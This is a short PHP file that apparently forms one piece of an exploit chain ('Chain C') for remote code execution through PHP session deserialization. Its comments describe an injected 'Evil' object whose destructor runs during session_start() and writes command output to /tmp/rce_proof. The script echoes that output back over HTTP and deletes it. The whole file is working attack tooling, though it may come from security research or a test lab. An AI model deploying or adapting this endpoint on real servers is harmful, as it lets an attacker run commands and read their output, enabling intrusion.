<?php
// Chain C read endpoint. Handler comes from .user.ini in this directory.
// The injected Evil object's __destruct fires DURING session_start()'s
// failed decode (before this line returns) and writes output to
// /tmp/rce_proof. We echo it so an HTTP-only client can read command
// output, then clean up so stale results can't fake success.
@session_start();
$p = @file_get_contents('/tmp/rce_proof');
if ($p !== false && $p !== '') {
    echo "==PROOF==\n" . $p . "==/PROOF==\n";
    @unlink('/tmp/rce_proof');
}
echo "OK handler=" . ini_get('session.serialize_handler') . "\n";
